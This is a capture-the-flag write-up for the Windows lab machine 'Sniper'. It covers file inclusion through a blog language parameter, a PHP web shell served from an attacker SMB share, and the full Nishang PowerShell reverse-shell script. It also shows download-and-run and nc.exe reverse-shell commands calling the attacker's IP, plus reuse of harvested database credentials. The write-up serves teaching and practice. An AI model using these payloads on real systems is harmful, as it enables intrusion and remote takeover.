# CTF Writeup: Sniper

## Lab Description

Sniper is a medium difficulty Windows machine which features a PHP server. The server hosts a file that is found vulnerable to local and remote file inclusion. Command execution is gained on the server in the context of `NT AUTHORITY\iUSR` via local inclusion of maliciously crafted PHP Session files. Exposed database credentials are used to gain access as the user `Chris`, who has the same password. Enumeration reveals that the administrator is reviewing CHM (Compiled HTML Help) files, which can be used the leak the administrators NetNTLM-v2 hash. This can be captured, cracked and used to get a reverse shell as administrator using a PowerShell credential object.

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 10.129.229.6  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 15:22 EDT
Nmap scan report for 10.129.229.6
Host is up (0.019s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Sniper Co.
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-01T02:23:43
|_  start_date: N/A
|_clock-skew: 7h00m00s

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   18.77 ms 10.10.14.1
2   18.73 ms 10.129.229.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.16 seconds
```

Let's proceed by checking out if we can enumerate shares on smb anonymously. --> Didn't work.

Let's checkout the webpage. Most of the links are down, besides a login page 

We created an user account & logged into the webpage. We are getting forwarded into an /user endpoint.
Let's further enumerate the /user endpoint since the portal is under construction and there is nothing we can do, to further exploit the webpage.

Couldn't retrieve anything and navigated back found an /blog endpoint which has language option this lang option has an .php lang parameter which could potentially be vulnerable to LFI. Let's test it out with Windows/win.ini

```
curl http://10.129.229.6/blog/?lang=/Windows/win.ini                             
<html>
<body>
<!DOCTYPE html>
<html lang="en" >

<head>
  <meta charset="UTF-8">
  <title>Services blog</title>
  
  
  
      <link rel="stylesheet" href="/blog/css/style.css">

  
</head>

<body>

  
<div id="main">
  <div class="container">
    <nav>
      <div class="nav-fostrap">
        <ul>
          <li><a href="/">Home</a></li>
          <li><a href="javascript:void(0)" >Language<span class="arrow-down"></span></a>
            <ul class="dropdown">
              <li><a href="/blog?lang=blog-en.php">English</a></li>
              <li><a href="/blog?lang=blog-es.php">Spanish</a></li>
              <li><a href="/blog?lang=blog-fr.php">French</a></li>
            </ul>
          </li>
          <li><a href="javascript:void(0)" >Download<span class="arrow-down"></span></a>
            <ul class="dropdown">
              <li><a href="">Tools</a></li>
              <li><a href="">Backlink</a></li>
            </ul>
          </li>
        </ul>
      </div>
      <div class="nav-bg-fostrap">
        <div class="navbar-fostrap"> <span></span> <span></span> <span></span> </div>
        <a href="" class="title-mobile">Fostrap</a>
      </div>
    </nav>
</div>
</div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
<script>
  
  

    <script  src="js/index.js"></script>




</body>

</html>
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
</body>
</html>
```

As we can see we got the file win.ini prompted which means it's vulnerable to LFI!

Now since PHP differentiates user's on an webpage with cookies. Let's retrieve our current session cookie and check out what we can do with it. I googled where php saves user cookie informations on windows and found out /Windows/Temp/sess_<session_cookie>

```
curl http://10.129.229.6/blog/?lang=/Windows/Temp/sess_q4luf3f63it7tjjf1qk6lg52qf
</html>
username|s:7:"saitama";</body>
</html>
```

Provided us that the user acc we created is getting linked to the session cookie.

Let's check for RFI.

```
curl http://10.129.229.6/blog/?lang=\\10.10.14.239\htb\test.txt
```

Start listener on smb default port 445 on local machine.

```
nc -lvnp 445
listening on [any] 445 ...
connect to [10.10.14.239] from (UNKNOWN) [10.129.229.6] 49855
E�SMBr▒S�����"NT LM 0.12SMB 2.002SMB 2.???
```

RFI is working, let's set our local smb server in kali linux to be able to be read & wrote by everyone. In order to do that we can navigate to /srv/smb and create an smb share.

Edit the following template which was [profiles] before to have the following content:

```
nano /etc/samba/smb.conf
[htb]
   comment = Users profiles
   path = /srv/smb
   guest ok = yes
   browseable = yes
   create mask = 0600
   directory mask = 0700
```

Start smb service

```
systemctl start smbd
```

Creates test.php in /srv/smb.

```
<?php system("echo(Hello, World!);"); ?>
```

Send request to server to request our file in our smb share.

```
http://10.129.229.6/blog/?lang=\\10.10.14.239\htb\test.php
```

Hello, World! is being displayed in the source code!

Let's save the following payload in an shell.php file within the smb share.

```
cat shell.php                                                     
<?php system($_REQUEST['cmd']); ?>
```

Paste the following cmd parameter inside & we should have command injection now!

```
http://10.129.229.6/blog/?lang=\\10.10.14.239\htb\shell.php&cmd=whoami
```

Let's get an shell. The following rev shell script will be utilized:

```
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.239 -Port 1337
```

Sending an request to the server to download our reverse shell on the target system.

```
curl http://10.129.229.6/blog/?lang=\\10.10.14.239\htb\shell.php&cmd=powershell+wget+"http%3a//10.10.14.239/Invoke-PowerShellTcp.ps1"
```

Script got sucessfully uploaded onto the server.

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.229.6 - - [31/Oct/2025 21:00:48] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

Started up listener on port 1337

```
nc -lvnp 1337
```

Soo now that we have an uploaded revshell file onto the target system, let's execute it with netcat.

We will have to put the netcat windows binary inside the smb share for this to work.

```
curl http://10.129.229.6/blog/?lang=\\10.10.14.239\htb\shell.php&cmd=\\10.10.14.239\htb\nc.exe+10.10.14.239+1337+-e+powershell
```

Gained RCE as user "nt authority\iusr".

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.239] from (UNKNOWN) [10.129.229.6] 49862
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\blog>
```

## Privilege Escalation

Checking for privs shows us that SeImpersonatePrivilege is online & we can abuse it.

```
PS C:\Users> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```

Let's Download PrintSpooferx64.exe onto the target system.

```
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.239/PrintSpoofer.exe');
```

Analyzed db.php file in C:\inetpub\wwwroot\user and retrieved credentials.

```
sniper:36mEAhz/B8xQ~2VM
```

Assuming sniper is the user "Chris".

Verified login using crackmapexec --> It worked!

```
crackmapexec smb 10.129.229.6 -u chris -p '36mEAhz/B8xQ~2VM'
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing FTP protocol database
[*] Initializing SMB protocol database
[*] Initializing WINRM protocol database
[*] Initializing SSH protocol database
[*] Initializing RDP protocol database
[*] Initializing LDAP protocol database
[*] Initializing MSSQL protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.129.229.6    445    SNIPER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SNIPER) (domain:Sniper) (signing:False) (SMBv1:False)
SMB         10.129.229.6    445    SNIPER           [+] Sniper\chris:36mEAhz/B8xQ~2VM
```

## Creating Credential Object

```
$password = convertto-securestring -AsPlainText -Force -String "36mEAhz/B8xQ~2VM";
$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\chris",$password;
```

Running the following command prompted us with an working command.

```
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -credential $credential;
sniper\chris
```

Started up listener on port 8888

```
nc -lvnp 8888
```

```
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { \\10.10.14.239\htb\nc.exe -e cmd.exe 10.10.14.239 8888 } -credential $credential;
```

Gained RCE as user "Chris".

```
nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.14.239] from (UNKNOWN) [10.129.229.6] 49873
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Chris\Documents>whoami
whoami
sniper\chris
```


